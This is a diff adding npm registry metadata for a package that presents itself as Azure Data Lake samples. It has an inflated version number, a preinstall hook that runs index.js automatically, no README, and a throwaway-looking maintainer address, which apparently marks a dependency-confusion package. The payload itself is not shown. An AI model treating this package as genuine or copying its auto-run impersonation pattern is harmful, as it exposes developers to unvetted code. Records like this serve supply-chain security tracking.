@@ -1,0 +1,62 @@
+{
+    "_id": "azure-storage-file-datalake-samples-js",
+    "name": "azure-storage-file-datalake-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-storage-file-datalake-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-storage-file-datalake-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-Br6bz+mbo86P9HhxdfZZJjaa8Or9SAJNpq5ktA9LUCX3ksfgMWbvbbJIX+BjoVPWueR4U0Ei9tNYfkqLSP/0ig==",
+                "shasum": "8009bd859ffde430529dd5087785a6c6c5a2322f",
+                "tarball": "https://registry.npmjs.org/azure-storage-file-datalake-samples-js/-/azure-storage-file-datalake-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5090,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOswxACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpDUg//bZQqrzy6dWaqnKDQeFlP7BuBlt/NCoAsfiCPcR1LyRBdqdGF\r\n1yr+aJKpTD6xCaR0b3G4hR4MjXXfaXQmg5pwa+8uMbRzi4k+ynRW13hylnaq\r\n3ZKjcQUtfYOVHZAv3bur75iDbvIthtgKPoYvj4EfmHrDu0JcEk/rKjt6vjtf\r\nwlqx12+fixl0LizhRg2kjwdOrtxjG+ShS2C71s4texdA4MeyqW16inI8FrOM\r\nevRKTA4m/PmRniJ0boDwa2q0FtMBg6OKIH2ANpTjbZ3fSn9afcRH9kriB/hI\r\nz/2JTRChZNYW4fmr9N5BnxaYV5vh3weTOpVJ5Yf/N+eMMGnFgdPyG43JbKsL\r\nRsfA+XV7JkZ4TFaeup+e4jZ27H51uWomxrGFcveQPYo5PF23iGBMRfzGcD8I\r\nDYRga7c37b2689kmHFZNLVseyecmDXVauzXg1uSF5QRBVOUK+tzkHghapIPm\r\n9otdOqAFXh443NOktgrgE0qRfVFQHlfgAN6GsPpzS6gwOA6HC27PfGlQNG3M\r\nx5K9lL8ysC3CJc8px8ORsM1rRjpLUE6uzHK6/y6NPpgtJDEISlTf+eNgewFc\r\nvypfNbTSwN/1PYgcBxkiNQP3z/R+PLOh7Ns4bO7YoOfzSdf7G+Zd4whbBvm3\r\n0jZh8Lw4/Jw5R8J7wt749ThS+xy1SpTKDuc=\r\n=fLFs\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "enh3yuj3",
+                "email": "enh3yuj3@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "enh3yuj3",
+                    "email": "enh3yuj3@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-storage-file-datalake-samples-js_99.10.9_1648020529250_0.3454839494425308"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T07:28:49.249Z",
+        "99.10.9": "2022-03-23T07:28:49.407Z",
+        "modified": "2022-03-23T07:28:49.503Z"
+    },
+    "maintainers": [
+        {
+            "name": "enh3yuj3",
+            "email": "enh3yuj3@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
